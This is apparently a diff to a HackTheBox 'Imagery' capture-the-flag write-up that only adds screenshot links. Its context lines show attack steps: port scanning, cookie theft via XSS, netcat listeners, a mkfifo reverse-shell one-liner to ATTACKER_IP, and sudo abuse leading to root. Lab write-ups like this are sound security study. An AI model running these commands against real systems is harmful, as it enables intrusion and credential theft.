@@ -10,6 +10,8 @@
 
 Initial scanning identified two exposed services:
 
+![](/writeups/notes/hackthebox–imagery/img/01.png)
+
 ```bash
 rustscan -a 10.10.11.88 -- -sC -sV -oN nmap
 ```
@@ -60,6 +62,8 @@ A basic XSS payload was used to exfiltrate session cookies:
 
 Listener setup:
 
+![](/writeups/notes/hackthebox–imagery/img/02.png)
+
 ```bash
 nc -lnvp 80
 ```
@@ -77,6 +81,8 @@ Once the admin cookie was received, it was reused to access privileged endpoints
 ## Admin Abuse & Internal Exposure
 
 Admin access revealed:
+
+![](/writeups/notes/hackthebox–imagery/img/03.png)
 
 environment details
 
@@ -109,6 +115,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 9001 >/tmp/f
 
 Shell obtained:
 
+![](/writeups/notes/hackthebox–imagery/img/04.png)
+
 ```bash
 id
 uid=1001(web) gid=1001(web)
@@ -122,6 +130,8 @@ At this stage, web exploitation transitioned into full system access.
 ## Local Enumeration & Encrypted Backups
 
 Enumeration revealed an encrypted archive in /var/backup:
+
+![](/writeups/notes/hackthebox–imagery/img/05.png)
 
 ```bash
 ls -la /var/backup
@@ -177,6 +187,8 @@ sudo -l
 
 Result:
 
+![](/writeups/notes/hackthebox–imagery/img/06.png)
+
 ```bash
 (ALL) NOPASSWD: /usr/local/bin/charcol
 ```
@@ -215,6 +227,8 @@ nc -lnvp 7777
 
 
 Within a minute, a root shell was received:
+
+![](/writeups/notes/hackthebox–imagery/img/07.png)
 
 ```bash
 id
